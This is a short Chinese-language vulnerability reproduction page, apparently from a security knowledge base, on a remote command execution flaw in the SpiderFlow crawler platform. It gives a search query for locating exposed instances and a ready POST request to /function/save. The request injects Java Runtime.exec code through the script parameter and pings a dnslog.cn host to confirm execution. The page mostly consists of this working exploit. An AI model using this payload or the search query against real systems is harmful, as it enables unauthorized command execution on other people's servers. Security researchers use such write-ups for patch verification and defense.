# SpiderFlow save 远程命令执行漏洞

## 漏洞描述

SpiderFlow 平台以流程图的⽅式定义爬⾍,是⼀个⾼度灵活可配置的爬⾍平台 

官⽹：https://www.spiderflow.org/

## 漏洞影响

<a-checkbox checked>SpiderFlow</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title=="SpiderFlow"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1640438666683-12d29712-e90c-483b-b311-9fd25f852ca4.png)

发送请求包执行命令

```go
POST /function/save

id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('ping chwd71.dnslog.cn');{
```

![img](../../../.vuepress/public/img/1640438711420-73f701ff-c390-4201-96df-1e62cdf44208.png)